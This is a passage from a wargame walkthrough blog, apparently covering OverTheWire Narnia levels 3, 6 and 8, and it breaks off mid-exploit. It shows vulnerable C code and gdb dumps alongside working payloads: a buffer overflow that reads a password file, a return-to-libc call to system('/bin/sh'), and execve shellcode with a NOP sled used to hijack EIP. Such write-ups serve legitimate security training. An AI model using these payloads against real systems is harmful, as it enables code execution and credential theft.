</span><span class='line'>narnia3@melissa:/tmp/skojiman3$ touch /tmp/hack
</span><span class='line'>narnia3@melissa:/tmp/skojiman3$ chmod 666 /tmp/hack
</span><span class='line'>narnia3@melissa:/tmp/skojiman3$ ls -l /tmp/hack
</span><span class='line'>-rw-rw-rw- 1 narnia3 narnia3 0 2012-11-24 22:58 /tmp/hack
</span><span class='line'>
</span><span class='line'>Finally, execute /narnia/narnia3 as follows:
</span><span class='line'>
</span><span class='line'>narnia3@melissa:/tmp/skojiman3$ /narnia/narnia3 `python -c 'print "A"*32 + "/tmp/hack"'`
</span><span class='line'>copied contents of AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hack to a safer place... (/tmp/hack)
</span><span class='line'>narnia3@melissa:/tmp/skojiman3$ cat /tmp/hack
</span><span class='line'>thaenohtai
</span><span class='line'>��*������e���@�narnia3@melissa:/tmp/skojiman3$</span></code></pre></td></tr></table></div></figure>
</li>

<li>
Let's see another example  <strong>Narnia6</strong>.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="k">extern</span> <span class="kt">char</span> <span class="o">**</span><span class="n">environ</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// tired of fixing values...</span>
</span><span class='line'><span class="c1">// - morla</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">get_sp</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>       <span class="n">__asm__</span><span class="p">(</span><span class="s">&quot;movl %esp,%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
</span><span class='line'>               <span class="s">&quot;and $0xff000000, %eax&quot;</span>
</span><span class='line'>               <span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">b1</span><span class="p">[</span><span class="mi">8</span><span class="p">],</span> <span class="n">b2</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">int</span>  <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">))</span><span class="o">&amp;</span><span class="n">puts</span><span class="p">,</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">!=</span><span class="mi">3</span><span class="p">){</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s b1 b2</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* clear environ */</span>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>      <span class="n">memset</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="sc">&#39;\0&#39;</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>
</span><span class='line'>  <span class="cm">/* clear argz    */</span>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">3</span><span class="p">;</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>      <span class="n">memset</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="sc">&#39;\0&#39;</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">b1</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">b2</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span><span class='line'>  <span class="c1">//if(((unsigned long)fp &amp; 0xff000000) == 0xff000000)</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">fp</span> <span class="o">&amp;</span> <span class="mh">0xff000000</span><span class="p">)</span> <span class="o">==</span> <span class="n">get_sp</span><span class="p">())</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="n">fp</span><span class="p">(</span><span class="n">b1</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

Stack is not executable for this binary. This binary is an example of “return-to-libc” attack is a computer security attack usually starting with a buffer overflow in which a subroutine return address on a call stack is replaced by an address of a subroutine that is already present in the process’ executable memory, rendering the NX bit feature useless (if present) and ridding the attacker of the need to inject their own code.

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb -q narnia6
</span><span class='line'>Reading symbols from /home/bitvijays/narnia6...(no debugging symbols found)...done.
</span><span class='line'>gdb-peda$ checksec 
</span><span class='line'>CANARY    : disabled
</span><span class='line'>FORTIFY   : disabled
</span><span class='line'>NX        : ENABLED
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : disabled
</span><span class='line'>gdb-peda$ </span></code></pre></td></tr></table></div></figure>
Let's compile the source on the local and check what happens:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gcc -m32 -ggdb -fno-stack-protector -Wall narnia6.c -o narnia61</span></code></pre></td></tr></table></div></figure>
If you see carefully, we passed A*8 + BBBB + " " + "C"*8 + DDDD, which resulted in
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb -q ./narnia61
</span><span class='line'>gdb-peda$ pdisass main
</span><span class='line'>Dump of assembler code for function main:
</span><span class='line'>   0x080486d2 &lt;+330&gt;:   call   0x8048450 &lt;exit@plt&gt;
</span><span class='line'>   0x080486d7 &lt;+335&gt;:   lea    eax,[esp+0x20]
</span><span class='line'>   0x080486db &lt;+339&gt;:   mov    DWORD PTR [esp],eax
</span><span class='line'>   0x080486de &lt;+342&gt;:   mov    eax,DWORD PTR [esp+0x28]
</span><span class='line'>   0x080486e2 &lt;+346&gt;:   call   eax
</span><span class='line'>   0x080486e4 &lt;+348&gt;:   mov    DWORD PTR [esp],0x1
</span><span class='line'>   0x080486eb &lt;+355&gt;:   call   0x8048450 &lt;exit@plt&gt;
</span><span class='line'>End of assembler dump.
</span><span class='line'>gdb-peda$ br *main+346
</span><span class='line'>Breakpoint 1 at 0x80486e2: file narnia6.c, line 48.
</span><span class='line'>gdb-peda$ run `python -c 'print "A"*8 + "BBBB" + " " + "C"*8 + "DDDD"'`
</span><span class='line'>[-------------------------------------code-------------------------------------]
</span><span class='line'>   0x80486d7 &lt;main+335&gt;:    lea    eax,[esp+0x20]
</span><span class='line'>   0x80486db &lt;main+339&gt;:    mov    DWORD PTR [esp],eax
</span><span class='line'>   0x80486de &lt;main+342&gt;:    mov    eax,DWORD PTR [esp+0x28]
</span><span class='line'>=&gt; 0x80486e2 &lt;main+346&gt;: call   eax
</span><span class='line'>   0x80486e4 &lt;main+348&gt;:    mov    DWORD PTR [esp],0x1
</span><span class='line'>   0x80486eb &lt;main+355&gt;:    call   0x8048450 &lt;exit@plt&gt;
</span><span class='line'>   0x80486f0 &lt;__libc_csu_fini&gt;: push   ebp
</span><span class='line'>   0x80486f1 &lt;__libc_csu_fini+1&gt;:   mov    ebp,esp
</span><span class='line'>Guessed arguments:
</span><span class='line'>arg[0]: 0xffffd380 ("DDDD")
</span><span class='line'>Breakpoint 1, 0x080486e2 in main (argc=0x3, argv=0xffffd444) at narnia6.c:48
</span><span class='line'>48        fp(b1);
</span><span class='line'>gdb-peda$ p b1
</span><span class='line'>$1 = "DDDD\000AAA"
</span><span class='line'>gdb-peda$ p b2
</span><span class='line'>$2 = "CCCCCCCC"
</span><span class='line'>gdb-peda$ p puts
</span><span class='line'>$3 = {&lt;text variable, no debug info&gt;} 0xf7eb3360 &lt;puts&gt;
</span><span class='line'>gdb-peda$ p system
</span><span class='line'>$4 = {&lt;text variable, no debug info&gt;} 0xf7e8bc30 &lt;system&gt;
</span><span class='line'>gdb-peda$ p &b1
</span><span class='line'>$5 = (char (*)[8]) 0xffffd380
</span><span class='line'>gdb-peda$ x/50xw 0xffffd350
</span><span class='line'>0xffffd360:   0xffffd380  0xffffd5df  0x0000003b  0x0804874b
</span><span class='line'>0xffffd370:   0x00000003  0xffffd444  0x43434343  0x43434343
</span><span class='line'>0xffffd380:   0x44444444  0x41414100  0x42424242  0x00000000
</span><span class='line'>0xffffd390:   0x08048700  0xf7fb0ff4  0xffffd418  0xf7e66e46
</span><span class='line'>0xffffd3a0:   0x00000003  0xffffd444  0xffffd454  0xf7fde860
</span><span class='line'>gdb-peda$ p fp
</span><span class='line'>$6 = (int (*)(char *)) 0x42424242
</span><span class='line'>gdb-peda$ p &fp
</span><span class='line'>$7 = (int (**)(char *)) 0xffffd388
</span><span class='line'>gdb-peda$ p $fp
</span><span class='line'>$8 = (void *) 0xffffd398</span></code></pre></td></tr></table></div></figure>
The address of fp "p &fp" is 0xffffd3888 which has a value of ("p fp") 0x42424242. As previously the stack is NoteXecutable, but stdlib.h is included in the C Program. Stdlib.h includes system call which has an address of ("p system") 0xf7e8bc30. Further DDDD overwrites AAAA with the Null byte.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia6@melinda:/narnia$ ./narnia6 `python -c 'print "A"*8 + "\x40\x1c\xe6\xf7" + " " + "C"*8 + "/bin/sh"'`
</span><span class='line'>$ cat /etc/narnia_pass/narnia7</span></code></pre></td></tr></table></div></figure>
</li>

<li>Let's see another example where we have to use a environment variable to invoke a shell <strong>Narnia8</strong>.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="c1">// gcc&#39;s variable reordering fucked things up</span>
</span><span class='line'><span class="c1">// to keep the level in its old style i am </span>
</span><span class='line'><span class="c1">// making &quot;i&quot; global unti i find a fix </span>
</span><span class='line'><span class="c1">// -morla </span>
</span><span class='line'><span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">b</span><span class="p">){</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">blah</span><span class="o">=</span><span class="n">b</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">bok</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
</span><span class='line'>  <span class="c1">//int i=0;</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">memset</span><span class="p">(</span><span class="n">bok</span><span class="p">,</span> <span class="sc">&#39;\0&#39;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bok</span><span class="p">));</span>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">blah</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>      <span class="n">bok</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">blah</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">bok</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">func</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s argument</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

Let's see what is happening here: for loop in function func copies data from blah to bok character array until a null character is found. Let's see how the stack would look like
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;bok character array&gt;&lt;blah pointer&gt;&lt;fp&gt;&lt;ret&gt;&lt;pointer b&gt;</span></code></pre></td></tr></table></div></figure>
Let's confirm this by using gdb? We put an breakpoint on printf function in the func function.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0xffffd670:  0x08048580  0xffffd688  0x00000014  0xf7e54f53
</span><span class='line'>0xffffd680:   0x00000000  0x00ca0000  0x41414141  0x41414141
</span><span class='line'>0xffffd690:   0x41414141  0x41414141  0x00414141  0xffffd8b1
</span><span class='line'>0xffffd6a0:   0x00000002  0xffffd764  0xffffd6c8  0x080484cd
</span><span class='line'>0xffffd6b0:   0xffffd8b1  0xf7ffd000  0x080484fb  0xf7fca000</span></code></pre></td></tr></table></div></figure>
Address 0xffffd689 marks the start of the character buffer bok. I entered 19 A so it's 0x41 19 times followed by null 0x00. Followed by that is 0xffffd8b1 (Value of Blah pointer). Followed by fp 12 bytes <0x00000002 0xffffd764 0xffffd6c8>. Followed by 0x080484cd which is the return address
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/s 0x080484cd
</span><span class='line'>0x80484cd &lt;main+31&gt;:    "\353\025\213E\f\213"</span></code></pre></td></tr></table></div></figure>
followed by pointer b (0xffffd8b1).
Let's see what's at location 0xffffd8b1
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/20wx 0xffffd8b1
</span><span class='line'>0xffffd8b1:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd8c1:   0x00414141  0x5f474458  0x53534553  0x5f4e4f49</span></code></pre></td></tr></table></div></figure>

Let's see what happens when we try to enter more than the 19 character (buffer size of bok - 1 byte (for null character))
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia8@melinda:/narnia$ ./narnia8 `python -c 'print "A"*20'`
</span><span class='line'>AAAAAAAAAAAAAAAAAAAA����
</span><span class='line'>narnia8@melinda:/narnia$ ./narnia8 `python -c 'print "A"*20'` | hexdump 
</span><span class='line'>0000000 4141 4141 4141 4141 4141 4141 4141 4141
</span><span class='line'>0000010 4141 4141 d8bf ffff 0a02               
</span><span class='line'>000001a</span></code></pre></td></tr></table></div></figure>
As expected, we get A followed by some garbage. which is the address where blah is pointing.

We know that we can overwrite the RET address by 
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># `python -c 'print "A"*20 + "\x90\x90\x90\x90" + "A"*12 + "BBBB"'`</span></code></pre></td></tr></table></div></figure>
Let's see what happens when we do this. After copying 20 A it copies \x90 and makes blah pointer from 0xffffd8bf to 0xffffd890. Because of the for loop
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>for(i=0; blah[i] != '\0'; i++)</span></code></pre></td></tr></table></div></figure>
It now copies the character from 0xffffd890 reference i.e 0xffffd890 + i value. Suppose it copied the character 0x41. The address becomes 0xffff4190 and now for loop searches from that address until a null character is found.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/20xw $esp
</span><span class='line'>0xffffd660:   0xffffd678  0x00000000  0x00000014  0xf7e54f53
</span><span class='line'>0xffffd670:   0x00000000  0x00ca0000  0x41414141  0x41414141
</span><span class='line'>0xffffd680:   0x41414141  0x41414141  0x41414141  0xffffd890
</span><span class='line'>0xffffd690:   0x00000002  0xffffd754  0xffffd6b8  0x080484cd
</span><span class='line'>0xffffd6a0:   0xffffd89c  0xf7ffd000  0x080484fb  0xf7fca000
</span><span class='line'>
</span><span class='line'>(gdb) x/10xw 0xffffd890
</span><span class='line'>0xffffd890:   0x2f61696e  0x6e72616e  0x00386169  0x41414141
</span><span class='line'>0xffffd8a0:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd8b0:   0x90909090  0x41414141
</span><span class='line'>
</span><span class='line'>(gdb) x/20xw $esp
</span><span class='line'>0xffffd660:   0x08048580  0xffffd678  0x00000014  0xf7e54f53
</span><span class='line'>0xffffd670:   0x00000000  0x00ca0000  0x41414141  0x41414141
</span><span class='line'>0xffffd680:   0x41414141  0x41414141  0x41414141  0xffff4190
</span><span class='line'>0xffffd690:   0x00000002  0xffffd754  0xffffd6b8  0x080484cd
</span><span class='line'>0xffffd6a0:   0xffffd89c  0xf7ffd000  0x080484fb  0xf7fca000
</span><span class='line'>
</span><span class='line'>(gdb) x/10xw 0xffff4190
</span><span class='line'>0xffff4190:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0xffff41a0:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0xffff41b0:   0x00000000  0x00000000</span></code></pre></td></tr></table></div></figure>

If we can somehow keep/change the blah pointer back to it's original value we may overwrite the RET pointer (after 12 bytes). Let's see how 0xffffd89c looks when is used
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>`python -c 'print "A"*20 + "\x90\x90\x90\x90" + "A"*12 + "BBBB"'`</span></code></pre></td></tr></table></div></figure>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/30xw 0xffffd89c
</span><span class='line'>0xffffd89c:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd8ac:   0x41414141  0x90909090  0x41414141  0x41414141
</span><span class='line'>0xffffd8bc:   0x41414141  0x42424242  0x47445800  0x5345535f</span></code></pre></td></tr></table></div></figure>

When we used the below with the address, we were able to overwrite the RET by BBBB. Now, we control the EIP :)
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) run `python -c 'print "A"*20 + "\x9c\xd8\xff\xff" + "A"*12 + "BBBB"'`
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>(gdb) x/20xw $esp
</span><span class='line'>0xffffd660:   0x08048580  0xffffd678  0x00000014  0xf7e54f53
</span><span class='line'>0xffffd670:   0x00000000  0x00ca0000  0x41414141  0x41414141
</span><span class='line'>0xffffd680:   0x41414141  0x41414141  0x41414141  0xffffd89c
</span><span class='line'>0xffffd690:   0x41414141  0x41414141  0x41414141  0x42424242</span></code></pre></td></tr></table></div></figure>

Let's export a shellcode using a environment variable check it's address on the stack and redirect the flow of our code to it. Notice the number of NOPs we have put for easy identification plus reachability.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>export EGG=`python -c 'print "\x90"*90 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`</span></code></pre></td></tr></table></div></figure>

Searching our environment variable we get it at address 0xffffd8d4.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/100xw $esp+500
</span><span class='line'>0xffffd7e4:   0x0000000f  0xffffd80b  0x00000000  0x00000000
</span><span class='line'>0xffffd7f4:   0x00000000  0xde000000  0x1a2a5992  0xf11444ea
</span><span class='line'>0xffffd804:   0x11433cf3  0x694a71a2  0x00363836  0x672f0000
</span><span class='line'>0xffffd814:   0x73656d61  0x72616e2f  0x2f61696e  0x6e72616e
</span><span class='line'>0xffffd824:   0x00386169  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd834:   0x41414141  0x41414141  0xffffd828  0x41414141
</span><span class='line'>0xffffd844:   0x41414141  0x41414141  0x42424242  0x47445800
</span><span class='line'>0xffffd854:   0x5345535f  0x4e4f4953  0x3d44495f  0x35343239
</span><span class='line'>0xffffd864:   0x45485300  0x2f3d4c4c  0x2f6e6962  0x68736162
</span><span class='line'>0xffffd874:   0x52455400  0x74783d4d  0x006d7265  0x5f485353
</span><span class='line'>0xffffd884:   0x45494c43  0x353d544e  0x34392e39  0x2e31362e
</span><span class='line'>0xffffd894:   0x20343731  0x37373835  0x32322032  0x48535300
</span><span class='line'>0xffffd8a4:   0x5954545f  0x65642f3d  0x74702f76  0x31312f73
